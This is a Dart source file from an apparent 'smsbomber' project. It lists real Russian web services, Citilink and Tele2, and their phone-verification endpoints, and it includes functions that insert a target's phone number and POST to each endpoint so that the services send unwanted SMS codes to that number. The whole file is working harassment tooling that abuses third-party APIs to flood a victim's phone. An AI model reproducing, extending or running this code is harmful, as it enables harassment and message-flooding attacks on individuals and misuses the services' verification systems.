part of smsbomber;

final _dio = Dio(BaseOptions(validateStatus: (status) => true));

enum Country { RU }
const countyList = {"RU": Country.RU};

final serviceList = [
  Service(
    name: "Citilink",
    url: Uri(
      scheme: "https",
      host: "www.citilink.ru",
      path: "registration/confirm/phone/+7{phone}",
    ),
    country: Country.RU,
    process: _serviceProcessFunctionDefault,
  ),
  Service(
    name: "Tele2",
    url: Uri(
      scheme: "https",
      host: "msk.tele2.ru",
      path: "api/validation/number/7{phone}",
    ),
    country: Country.RU,
    process: (service, phone) => _dio.post(
      service.url.toString().replaceFirst("%7Bphone%7D", "$phone"),
      data: jsonEncode(const {"sender": "Tele2"}),
    ),
  )
];

Future<Response> _serviceProcessFunctionDefault(Service service, String phone) =>
    _dio.post(service.url.toString().replaceFirst("%7Bphone%7D", "$phone"));
